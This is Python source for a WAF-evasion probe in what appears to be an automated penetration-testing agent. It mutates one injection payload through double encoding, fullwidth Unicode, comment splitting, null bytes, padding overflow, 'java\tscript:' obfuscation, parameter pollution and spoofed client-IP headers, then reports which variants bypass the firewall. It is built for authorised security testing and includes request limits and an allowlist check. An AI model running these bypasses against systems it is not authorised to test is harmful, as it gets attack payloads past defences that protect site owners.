"""waf_evasion_probe: payload/signature-level WAF evasion probing -- a small, FIXED, bounded matrix
of encoding/case/whitespace/HTTP-shape mutations of ONE payload, reporting which variant(s) got a
materially different response than a clean baseline. Real motivation: a real session
(usr_136b4c) hit a WAF that blocked every injection attempt outright ("WAF/rate-limiting
blocks all injection attempts on both hosts") and the agent had no mechanism to try a bypass before
giving up entirely -- this is that mechanism, for the payload/signature layer specifically.

A SEPARATE layer already exists for TRANSPORT/TLS-fingerprint evasion (native.py's http_request,
via _browser_fingerprint_fallback_get's curl_cffi impersonation on a RemoteProtocolError) -- this
tool's job is strictly the payload/signature layer, not overlapping with that.

Deliberately NOT a fuzzer: exactly 12 requests per call (1 baseline + 11 mutations), spaced
_REQUEST_DELAY_SECONDS apart. This project has real, repeated exposure to strict program-policy
language forbidding "automated scanners or tools that generate a large amount of network traffic"
(real programs' own pre-scan policy hypotheses) -- a WAF-evasion tool is exactly the shape of
thing that could look like precisely what those rules forbid if it weren't kept small and bounded
on purpose, both in code and in the tool's own model-facing description.

Closes the CHEAP/COMMON detection tier only -- signature/encoding-level bypasses. Never a claim
against a determined behavioral/IP-reputation system (Cloudflare Turnstile-grade challenges are a
separate, harder problem, not addressed here -- see agent/tools/browser_stealth.py for the
fingerprint-level half of this same "evasion" effort).
"""
from __future__ import annotations

import os
import re
import time
from collections.abc import Callable
from urllib.parse import quote, urlencode, urlsplit, urlunsplit

import httpx

from agent.tools.native import _target_client_kwargs
from agent.tools.passive_detectors import (
    detect_command_injection,
    detect_open_redirect,
    detect_reflected_payload,
    detect_sql_error,
)
from agent.utils.logger import get_logger

logger = get_logger("TOOLS")

_REQUEST_DELAY_SECONDS = 0.4
# Reuses HTTP_REQUEST_TIMEOUT_SECONDS (native.py's http_request already reads this exact env var
# for the identical case -- one HTTP request against the real target) instead of a separate,
# duplicate timeout knob for what's the same underlying operation.
_TIMEOUT_SECONDS = float(os.getenv("HTTP_REQUEST_TIMEOUT_SECONDS", "10"))
# RFC 5737 TEST-NET-3 -- reserved for documentation, never a real routable address, so spoofing it
# in X-Forwarded-For can never be mistaken for impersonating an actual third party's real IP.
_SPOOFED_CLIENT_IP = "203.0.113.10"


def _build_url(base_url: str, param_name: str, encoded_value: str) -> str:
    """Appends param_name=encoded_value to base_url's own query string -- encoded_value is used
    VERBATIM, never re-encoded here, since exact control over percent-encoding is the entire point
    of several of the mutations below (httpx's own params= kwarg would silently re-encode an
    already-encoded value, which is why every call site here builds the URL by hand instead)."""
    parts = urlsplit(base_url)
    sep = "&" if parts.query else ""
    return urlunsplit((parts.scheme, parts.netloc, parts.path, f"{parts.query}{sep}{param_name}={encoded_value}", parts.fragment))


# --- payload mutations: each takes the RAW payload string, returns an already-percent-encoded
# query-value string ready to hand straight to _build_url -----------------------------------------


def _mut_baseline(payload: str) -> str:
    return quote(payload, safe="")


def _mut_double_url_encode(payload: str) -> str:
    return quote(quote(payload, safe=""), safe="")


def _mut_unicode_fullwidth(payload: str) -> str:
    # Fullwidth Unicode forms of the ASCII special characters a signature-based WAF regex is
    # written against -- a backend that Unicode-normalizes (NFKC) before parsing sees the real
    # character; a WAF regex written for the ASCII form does not.
    table = str.maketrans({"<": "＜", ">": "＞", "'": "＇", '"': "＂", "(": "（", ")": "）", ";": "；"})
    return quote(payload.translate(table), safe="")


def _mut_case_randomize(payload: str) -> str:
    mutated = "".join(ch.upper() if i % 2 == 0 else ch.lower() for i, ch in enumerate(payload))
    return quote(mutated, safe="")


def _mut_inline_comment_split(payload: str) -> str:
    # Splits every run of 3+ letters with an inline comment marker (SQL's /**/ is a real no-op
    # comment there; for non-SQL payloads this still often survives a parser tolerant of stray
    # markup) -- defeats an exact-substring/keyword-match WAF rule without necessarily breaking the
    # underlying parser's own tokenization.
    def _split(match: re.Match) -> str:
        word = match.group(1)
        mid = len(word) // 2
        return word[:mid] + "/**/" + word[mid:]
    return quote(re.sub(r"([A-Za-z]{3,})", _split, payload), safe="")


def _mut_alt_whitespace(payload: str) -> str:
    return quote(payload, safe="").replace("%20", "%09")


def _mut_null_byte(payload: str) -> str:
    return quote(payload, safe="") + "%00"


# Real, published WAF-bypass class: several managed rulesets (documented against AWS WAF's own
# default body-inspection limit) only inspect the first N bytes of a field before passing the rest
# through un-inspected, while the origin backend still parses the field in full -- padding the
# front of the value past that limit lets the payload after it reach the backend uninspected.
# Configurable, not hardcoded (this project's own "anything that can vary belongs in config" rule)
# since the real limit varies by WAF vendor/config and isn't something this project can know
# in advance for a given target.
_PADDING_OVERFLOW_BYTES = int(os.getenv("WAF_EVASION_PADDING_BYTES", "8192"))


def _mut_padding_overflow(payload: str) -> str:
    return quote("A" * _PADDING_OVERFLOW_BYTES + payload, safe="")


# Browser-confirmed behaviour (WHATWG URL / HTML5 spec): ASCII tab/newline/CR are stripped from a
# javascript: URI wherever they appear before it's executed, so "java\tscript:alert(1)" still runs
# in a real browser -- a WAF/sanitizer keyword-matching the literal substring "javascript:" does
# not see it. No-ops (falls through to a baseline-equivalent encode) for a payload that doesn't
# contain a javascript: scheme at all, same as _mut_inline_comment_split already no-ops for a
# payload with no 3+ letter run -- consistent with this file's existing "always transform, some
# payload shapes just have nothing for a given mutation to act on" convention.
_JAVASCRIPT_SCHEME_PATTERN = re.compile(r"javascript\s*:", re.IGNORECASE)


def _mut_protocol_obfuscation(payload: str) -> str:
    return quote(_JAVASCRIPT_SCHEME_PATTERN.sub("java\tscript:", payload), safe="")


_PAYLOAD_MUTATIONS: list[tuple[str, Callable[[str], str]]] = [
    ("double_url_encode", _mut_double_url_encode),
    ("unicode_fullwidth", _mut_unicode_fullwidth),
    ("case_randomize", _mut_case_randomize),
    ("inline_comment_split", _mut_inline_comment_split),
    ("alt_whitespace_encoding", _mut_alt_whitespace),
    ("null_byte_insertion", _mut_null_byte),
    ("padding_overflow", _mut_padding_overflow),
    ("protocol_obfuscation", _mut_protocol_obfuscation),
]


def _run_variant(
    client: httpx.Client, name: str, method: str, url: str,
    data: str | None, extra_headers: dict[str, str] | None, baseline: dict | None,
) -> dict:
    try:
        resp = client.request(method, url, content=data, headers=extra_headers)
    except httpx.HTTPError as exc:
        return {"mutation": name, "status": "error", "error": str(exc)}

    body = resp.text
    # Same deterministic signature bank http_request itself uses (native.py) -- a mutation that
    # both changes the status code AND trips a real reflected-payload/SQL-error/command-injection
    # signature is categorically stronger evidence than a status-code diff alone.
    detector_hits = {
        "reflected_payload_detected": detect_reflected_payload(url, body),
        "sql_error_detected": detect_sql_error(url, body),
        "open_redirect_detected": detect_open_redirect(
            url, [(hop.status_code, dict(hop.headers)) for hop in resp.history],
        ),
        "command_injection_detected": detect_command_injection(url, body),
    }
    result = {
        "mutation": name,
        "status_code": resp.status_code,
        "length": len(body),
        "differs_from_baseline": baseline is not None and resp.status_code != baseline["status_code"],
    }
    result.update({k: v for k, v in detector_hits.items() if v is not None})
    return result


def waf_evasion_probe(params: dict) -> dict:
    # "target" specifically, not "url" -- agent/tools/runner.py's _check_guardrail (the
    # exploitation-allowlist check) reads this exact key verbatim off the raw params dict; a
    # differently-named field would silently skip that gate.
    target = params["target"]
    param_name = params["param_name"]
    payload = params["payload"]
    method = (params.get("method") or "GET").upper()
    client_kwargs = _target_client_kwargs(params)

    logger.debug("waf_evasion_probe: target=%r param=%r method=%s starting (1 baseline + %d mutations)", target, param_name, method, len(_PAYLOAD_MUTATIONS) + 3)

    with httpx.Client(timeout=_TIMEOUT_SECONDS, follow_redirects=True, **client_kwargs) as client:
        baseline_url = _build_url(target, param_name, _mut_baseline(payload))
        baseline = _run_variant(client, "baseline", method, baseline_url, None, None, None)
        if baseline.get("status") == "error":
            logger.debug("waf_evasion_probe: target=%r baseline request itself failed: %s", target, baseline.get("error"))
            return {"status": "error", "error": f"baseline request failed: {baseline['error']}"}

        variants: list[dict] = []
        for name, mutate in _PAYLOAD_MUTATIONS:
            time.sleep(_REQUEST_DELAY_SECONDS)
            url = _build_url(target, param_name, mutate(payload))
            variants.append(_run_variant(client, name, method, url, None, None, baseline))

        # HTTP parameter pollution: the SAME param name twice, payload only in the second
        # occurrence -- some WAFs only inspect the first occurrence, many backends take the last.
        time.sleep(_REQUEST_DELAY_SECONDS)
        pollution_url = _build_url(_build_url(target, param_name, "x"), param_name, _mut_baseline(payload))
        variants.append(_run_variant(client, "parameter_pollution", method, pollution_url, None, None, baseline))

        # Alternate HTTP method: move the same payload between query string and request body --
        # a WAF ruleset that only strictly inspects one request shape misses the other.
        time.sleep(_REQUEST_DELAY_SECONDS)
        if method == "GET":
            alt_url, alt_data, alt_headers = target, urlencode({param_name: payload}), {"Content-Type": "application/x-www-form-urlencoded"}
            alt_method = "POST"
        else:
            alt_url, alt_data, alt_headers = _build_url(target, param_name, _mut_baseline(payload)), None, None
            alt_method = "GET"
        variants.append(_run_variant(client, "alternate_method", alt_method, alt_url, alt_data, alt_headers, baseline))

        # Spoofed client-IP headers -- addresses the RATE-LIMIT/IP-reputation half of the finding
        # that originally motivated this tool ("WAF/RATE-LIMITING blocks all injection attempts"),
        # which none of the payload-signature mutations above touch at all: many WAF/rate-limit
        # configs trust these headers naively when set by what they assume is an upstream proxy.
        time.sleep(_REQUEST_DELAY_SECONDS)
        spoof_headers = {"X-Forwarded-For": _SPOOFED_CLIENT_IP, "X-Real-IP": _SPOOFED_CLIENT_IP, "X-Originating-IP": _SPOOFED_CLIENT_IP}
        variants.append(_run_variant(client, "spoofed_client_ip", method, baseline_url, None, spoof_headers, baseline))

    candidate_bypasses = [
        v["mutation"] for v in variants
        if v.get("status") != "error" and (v.get("differs_from_baseline") or any(k.endswith("_detected") for k in v))
    ]
    logger.debug("waf_evasion_probe: target=%r finished, baseline_status=%s candidate_bypasses=%s", target, baseline["status_code"], candidate_bypasses)
    return {
        "status": "ok",
        "baseline": baseline,
        "variants": variants,
        "candidate_bypasses": candidate_bypasses,
    }
